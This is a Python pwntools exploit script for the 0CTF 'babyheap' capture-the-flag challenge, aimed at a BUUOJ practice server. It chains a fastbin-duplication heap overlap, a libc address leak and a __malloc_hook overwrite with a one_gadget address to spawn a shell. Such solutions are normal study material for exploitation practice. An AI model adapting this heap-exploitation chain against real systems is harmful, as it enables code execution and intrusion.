#coding: utf-8
from pwn import *
from LibcSearcher import *
elf = ELF("./0ctfbabyheap")
sh = process("./0ctfbabyheap")
sh = remote("node3.buuoj.cn",26326)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def alloc(size):
    sh.sendlineafter("Command: ",'1')
    sh.sendlineafter("Size: ",str(size))

def fill(index, Content):
    sh.sendlineafter("Command: ",'2')
    sh.sendlineafter("Index: ",str(index))
    sh.sendlineafter("Size: ",str(len(Content)))
    sh.sendlineafter("Content: ",Content)
    sh.recvuntil(": ")

def free(index):
    sh.sendlineafter("Command: ",'3')
    sh.sendlineafter("Index: ",str(index))

def dump(index):
    sh.sendlineafter("Command: ",'4')
    sh.sendlineafter("Index: ",str(index))
    sh.recvuntil("Content: \n")
    return sh.recv()

libc_offset = 0x3c4b78

def fastbin_dup():

    alloc(0x10) #chunk0
    alloc(0x10) #chunk1
    alloc(0x10) #chunk2
    alloc(0x10) #chunk3
    alloc(0x80) #chunk4

    free(1)
    free(2)

    #fill chunk2->fd = chunk4
    payload = "a"*0x10
    payload += p64(0) + p64(0x21)  
    payload += p64(0) + 'A' * 8
    payload += p64(0) + p64(0x21)
    payload += p8(0x80)
    fill(0,payload)
    payload =b"a"*0x10
    payload += p64(0)+p64(0x21)
    fill(3,payload) #chunk4->size = 0x21  绕过fastbin检查

    alloc(0x10)  #reocvery chunk1
    alloc(0x10)  #recovery chunk2

def leak_libc():
    global libc_base, malloc_hook
    payload = 'd' * 0x10
    payload += p64(0) + p64(0x91) #reocvery chunk4->size 
    fill(3,payload)
    alloc(0x80) #chunk5
    free(4)

    leak_addr = u64(dump(2)[:8])
    libc_base = leak_addr - 0x3c4b78
    #劫持chunk_hook malloc_hook->one_gadget 
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    log.info("leak address:0x%x" %leak_addr)
    log.info("libc_base:0x%x"%libc_base)
    log.info("malloc_hook : 0x%x"%malloc_hook)
def pwn():
    sh.sendline("\n")
    alloc(0x60) #chunk4
    free(4)
    gdb.attach(sh)
    pause()
    fill(2,p64(malloc_hook-0x23))
    alloc(0x60)
    alloc(0x60)
    # 0x45226
    # 0x4527a
    # 0xf0364
    # 0xf1207
    one_gadget = libc_base +0x4527a
    fill(6,p8(0)*3 +p64(0)*2+ p64(one_gadget))
    alloc(1)
    gdb.attach(sh)
    pause()
    sh.interactive()

if __name__=='__main__':
    fastbin_dup()
    leak_libc()
    pwn()
